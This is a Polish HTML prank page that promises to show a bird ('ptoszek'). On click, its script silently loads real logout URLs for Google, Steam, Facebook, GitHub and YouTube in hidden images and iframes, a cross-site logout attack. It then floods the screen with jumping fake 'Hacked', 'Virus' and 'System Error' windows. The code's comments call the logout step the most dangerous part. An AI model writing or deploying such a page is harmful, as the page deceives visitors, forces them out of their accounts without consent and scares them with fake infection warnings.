<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<title>Ptoszek</title>
<style>
  body { margin: 0; overflow: hidden; background: #111; color: #fff; font-family: sans-serif; }
  .fake-window {
    position: fixed; width: 200px; padding: 10px;
    background: #fff; color: #000; border: 1px solid #000;
    font-size: 12px; z-index: 9999; cursor: pointer;
    box-shadow: 2px 2px 10px rgba(0,0,0,0.5);
  }
  .fake-window .title { font-weight: bold; background: #ddd; padding: 2px; margin: -10px -10px 5px -10px; }
  #start { text-align: center; margin-top: 20vh; font-size: 24px; }
</style>
</head>
<body>

<div id="start">Kliknij, żeby zobaczyć ptoszka 🐦</div>

<script>
// --- 1. LISTA ADRESÓW WYLOGOWANIA (to robi największe wrażenie) ---
// UWAGA: To są prawdziwe adresy logout. Otwierane w ukryciu wylogują Cię z kont.
const logoutUrls = [
  'https://accounts.google.com/Logout',
  'https://store.steampowered.com/logout',
  'https://www.facebook.com/logout.php',
  'https://github.com/logout',
  'https://www.youtube.com/logout'
];

// --- 2. FUNKCJA WYLOGOWANIA ---
function forceLogout() {
  logoutUrls.forEach(url => {
    // Tworzymy ukryty iframe lub obrazek – przeglądarka wykona żądanie
    const img = document.createElement('img');
    img.src = url; // Przeglądarka próbuje załadować, co często wystarcza do wylogowania
    img.style.display = 'none';
    document.body.appendChild(img);

    // Alternatywnie iframe (często skuteczniejszy)
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
  });
}

// --- 3. SKACZĄCE "OKNA" (Divy udające okna) ---
const texts = ['Błąd', 'Hacked', 'Ptoszek', 'System Error', 'Uwaga!', 'Wirus'];
let windowCount = 0;

function spawnWindow() {
  if (windowCount > 40) return; // Limit, żeby nie zabić przeglądarki
  const win = document.createElement('div');
  win.className = 'fake-window';
  win.innerHTML = `<div class="title">${texts[Math.floor(Math.random()*texts.length)]}</div>To tylko żart :)`;
  
  // Losowa pozycja
  win.style.left = Math.random() * (window.innerWidth - 220) + 'px';
  win.style.top = Math.random() * (window.innerHeight - 100) + 'px';
  
  // Ruch (skakanie)
  setInterval(() => {
    win.style.left = Math.random() * (window.innerWidth - 220) + 'px';
    win.style.top = Math.random() * (window.innerHeight - 100) + 'px';
  }, 500 + Math.random() * 1000);

  // Kliknięcie zamyka (ale nie wszystkie naraz)
  win.onclick = () => { win.remove(); windowCount--; };

  document.body.appendChild(win);
  windowCount++;
}

// --- 4. ODPALENIE ---
document.getElementById('start').onclick = () => {
  document.getElementById('start').style.display = 'none';
  
  // Wylogowanie (najgroźniejsze, ale robi wrażenie)
  forceLogout();
  
  // Wysyp okienek
  for (let i = 0; i < 20; i++) {
    setTimeout(spawnWindow, i * 200);
  }
  
  // Dźwięk (opcjonalnie)
  // const audio = new Audio('https://www.myinstants.com/media/sounds/rickroll.mp3');
  // audio.play().catch(e => console.log('Audio blocked'));
};
</script>
</body>
</html>
